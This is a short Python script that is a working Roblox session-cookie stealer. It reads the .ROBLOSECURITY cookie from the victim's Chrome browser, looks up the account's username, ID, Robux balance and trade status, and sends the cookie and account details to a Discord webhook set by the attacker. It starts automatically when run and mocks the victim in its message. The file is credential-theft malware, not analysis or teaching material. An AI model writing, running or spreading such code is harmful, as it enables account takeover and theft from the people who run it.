import browser_cookie3 as cum, requests, threading, robloxpy.User.Internal as user

webhook = "WEBHOOK HERE"

def main():
    try:
        getcookie = cum.chrome(domain_name='roblox.com')
        cookies = str(getcookie)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        user.SetCookie(cookie)
        ok = {
            "username": "Logger Waifu",
            "avatar_url": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/649adf24-60c9-4b7c-8ccf-e828ce51825d/dddqxj0-12dc5989-6e8e-4a0f-bf9f-887a5db96b18.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3sicGF0aCI6IlwvZlwvNjQ5YWRmMjQtNjBjOS00YjdjLThjY2YtZTgyOGNlNTE4MjVkXC9kZGRxeGowLTEyZGM1OTg5LTZlOGUtNGEwZi1iZjlmLTg4N2E1ZGI5NmIxOC5wbmcifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.kHjYfE48SYiPGR0M3GHDyRNbP8Iw87SumhIH7pjOKUo",
            "embeds": [
                {
                    "title": "A Cookie has been logged.",
                    "description": f"```{cookie}```",
                    "url":f'https://www.roblox.com/users/{user.UserID}/trade',
                    "color": 14387362,
                "thumbnail": {
                    "url": user.Thumbnail
                },
                "fields": [
                {
                    'name':'Username',
                    'value':user.Username,
                    'inline': 'true'
                },
                {
                    'name':'UserID',
                    'value':user.UserID,
                    'inline': 'true'
                },
                {
                    'name':'Robux',
                    'value':user.Robux,
                    'inline': 'true'
                },
                {
                    'name':'Premium? (bool)',
                    'value':user.isPremium,
                    'inline': 'true'
                },
                {
                    'name':'Can Trade? (bool)',
                    'value':user.CanTrade,
                    'inline': 'true'
                }
                ],
                "footer": {
                    "text": "Whatta retard."
                }
                }
            ]
        }
        requests.post(webhook, json=ok)
    except:
        ok = {
            "username": "Logger Waifu",
            "avatar_url": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/649adf24-60c9-4b7c-8ccf-e828ce51825d/dddqxj0-12dc5989-6e8e-4a0f-bf9f-887a5db96b18.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3sicGF0aCI6IlwvZlwvNjQ5YWRmMjQtNjBjOS00YjdjLThjY2YtZTgyOGNlNTE4MjVkXC9kZGRxeGowLTEyZGM1OTg5LTZlOGUtNGEwZi1iZjlmLTg4N2E1ZGI5NmIxOC5wbmcifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.kHjYfE48SYiPGR0M3GHDyRNbP8Iw87SumhIH7pjOKUo",
            "embeds": [
                {
                    "title": "Error, cookie could not be logged.",
                    "description":"The user could be logged out, or there was an error somewhere in the code.",
                    "color": 14387362
                }
            ]
        }
        requests.post(webhook, json=ok)
threading.Thread(target=main).start()
